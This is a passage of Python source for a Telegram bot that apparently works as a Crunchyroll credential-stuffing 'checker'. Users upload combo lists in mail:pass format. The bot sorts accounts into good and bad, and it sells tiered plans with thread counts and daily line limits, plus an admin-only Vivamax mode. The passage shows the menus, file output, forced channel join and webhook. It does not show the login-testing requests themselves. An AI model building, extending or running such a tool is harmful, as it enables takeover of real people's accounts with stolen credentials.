        bad_file = f"/tmp/crunchy_bad_{timestamp}.txt"
        with open(bad_file, "w", encoding="utf-8") as f:
            f.write(bad_text)
        
        bad_caption = f"""
❌ <b>{bad_count}x Bad Accounts</b>
────────────────────────────
☰ BY @caydigitals ✅
────────────────────────────
<a href="https://t.me/caysredirect">BOT</a> | <a href="https://t.me/cayigitals">Admin</a>
        """.strip()

        await update.message.reply_document(
            document=open(bad_file, "rb"),
            filename=f"Crunchyroll Bad @caydigitals.txt",
            caption=bad_caption,
            parse_mode='HTML'
        )

async def edit_to_main_menu(update_or_query, context):
    context.user_data['in_main_menu'] = True
    """Smart function that works for BOTH callback buttons and normal messages"""
    # ←←← IMPORTANT: Clear waiting state when returning to main menu
    if 'waiting_for_threads' in context.user_data:
        context.user_data['waiting_for_threads'] = False

    # Get user_id from either Update or CallbackQuery
    if hasattr(update_or_query, 'callback_query') and update_or_query.callback_query is not None:
        user_id = update_or_query.callback_query.from_user.id
    elif hasattr(update_or_query, 'from_user') and update_or_query.from_user is not None:
        user_id = update_or_query.from_user.id
    else:
        user_id = update_or_query.effective_user.id

    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    # File statistics for dashboard
    max_files = limits.get("multi_scan_max_files", 1)
    today_files = stats.get("today_files", 0)

    keyboard = [
        [
            InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
            InlineKeyboardButton("🔗 My Referrals", callback_data="menu_referrals")
        ],
        [
            InlineKeyboardButton("🎁 Rewards & Gifts", callback_data="menu_rewards"),
            InlineKeyboardButton("💎 Membership", callback_data="menu_membership")
        ],
        [
            InlineKeyboardButton("📞 Support", callback_data="menu_support"),
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome = f"""
<b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗔𝗬'𝗦 • 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b>
━━━━━━━━━━━━━━━━━━━━━━━━
📤 <b>Send your combo list (.txt file)</b>
<i>Format: mail:pass (one per line)</i>
━━━━━━━━━━━━━━━━━━━━━━━━
📊<b>Your Dashboard:</b>
🧵 Threads: <code><b>{limits['current_threads']}/{limits['max_threads']}</b></code>
📁 Files Today: <code><b>{today_files}/{max_files}</b></code>
👑 Plan: <code><b>{limits['display_name']}</b></code>
📅 Days Left: <code><b>{get_days_remaining(stats['expires'])}</b></code>
📈 Daily Limit: <code><b>{limits['remaining_text']} lines</b></code>
📡 Mode: <code><b>{get_mode_display(stats.get('api_mode'))} Check</b></code>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option from the menu below:</b>
"""
    
    if hasattr(update_or_query, 'callback_query') and update_or_query.callback_query is not None:
        query = update_or_query.callback_query
        await query.edit_message_text(welcome, parse_mode='HTML', reply_markup=reply_markup)
    else:
        await update_or_query.message.reply_text(welcome, parse_mode='HTML', reply_markup=reply_markup)

async def manage_result_pin(update: Update, context: CallbackContext, message_id: int):
    """Unpin previous result and pin the new one (keeps only latest result pinned)"""
    chat_id = update.effective_chat.id
    
    # Unpin old result if exists (prevents chat clutter)
    old_id = context.user_data.get('last_pinned_result_id')
    if old_id:
        try:
            await context.bot.unpin_chat_message(chat_id=chat_id, message_id=old_id)
        except:
            pass  # already deleted or error
    
    # Pin the new result
    try:
        await context.bot.pin_chat_message(
            chat_id=chat_id,
            message_id=message_id,
            disable_notification=True
        )
        context.user_data['last_pinned_result_id'] = message_id
    except Exception as e:
        print(f"⚠️ Failed to pin result: {e}")

async def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    data = query.data

    # Handle verification button
    if data == "verify_join":
        if await check_subscription(update, context):
            await edit_to_main_menu(update, context)
        else:
            # ←←← THIS IS THE FIX
            await query.answer(
                "❌ You haven't joined the channel yet!\n\n"
                "Please join @caysredirect first, then tap Verify again.",
                show_alert=True
            )
            # Do NOT call send_join_channel_message again (prevents the error)
        return

    # Normal check for all other buttons
    if not await check_subscription(update, context):
        await query.answer("❌ You must join @caysredirect first!", show_alert=True)
        await send_join_channel_message(update, context)
        return

    if data == "menu_stats":
            context.user_data['in_main_menu'] = False
            await show_statistics_menu(query, context)
    
    elif data == "menu_referrals":
        context.user_data['in_main_menu'] = False
        await show_referrals_menu(query, context)
    
    elif data == "menu_rewards":
        context.user_data['in_main_menu'] = False
        await show_rewards_menu(query, context)

    elif data == "claim_daily_reward":
        await claim_daily_reward(query, context)

    elif data == "redeem_gift_code":
        await query.answer("📦 Gift code redemption coming soon!", show_alert=True)
        await show_rewards_menu(query, context)
    
    elif data == "menu_membership":
        context.user_data['in_main_menu'] = False
        await show_membership_menu(query, context)
    
    elif data == "menu_settings":
        context.user_data['in_main_menu'] = False
        await show_settings_menu(query, context)
    
    elif data == "set_threads":
        context.user_data['in_main_menu'] = False
        await handle_set_threads(query, context)
    
    elif data == "set_api_mode":
        context.user_data['in_main_menu'] = False
        await show_api_mode_menu(query, context)

    elif data.startswith("set_mode:"):
        new_mode = data.split(":", 1)[1]
        user_id = query.from_user.id
        
        # === ADMIN-ONLY PROTECTION FOR VIVAMAX ===
        if new_mode == "Vivamax" and user_id != ADMIN_ID:
            await query.answer("❌ Vivamax mode is Admin Only!", show_alert=True)
            return

        stats = get_user_stats(user_id)
        current_mode = stats.get("api_mode", "Crunchyroll")

        if new_mode == current_mode:
            await query.answer("ℹ️ Already in this mode", show_alert=False)
            return

        # Update BOTH columns in database
        update_user_stats(user_id, {"api_mode": new_mode})

        await query.answer(f"✅ Switched to {new_mode} Mode!", show_alert=False)
        await show_api_mode_menu(query, context)
    
    elif data == "back_to_main":
        await edit_to_main_menu(update, context)
    
    elif data == "menu_support":
        context.user_data['in_main_menu'] = False
        await show_support_menu(query, context)
    
    else:
        text = "Unknown option"
        await query.edit_message_text(text, parse_mode='HTML')

# Register handlers
tg_app.add_handler(CommandHandler("start", start))
tg_app.add_handler(CommandHandler("setplan", set_plan_command))
tg_app.add_handler(CommandHandler("resetreward", reset_reward_command))
tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
tg_app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
tg_app.add_handler(CallbackQueryHandler(button_callback))

# ============== WEBHOOK ENDPOINT ==============
@app.post("/webhook")
async def webhook(request: Request):
    try:
        data = await request.json()
        update = Update.de_json(data, tg_app.bot)
        
        # Process update safely
        await tg_app.process_update(update)
        return {"status": "ok"}
    
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        # Still return 200 so Telegram stops retrying
        return {"status": "error"}
    
# Optional: Health check
@app.get("/webhook")
async def webhook_get():
    return {
        "status": "✅ Webhook is Active",
        "info": "Telegram uses POST requests only. This is normal."
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
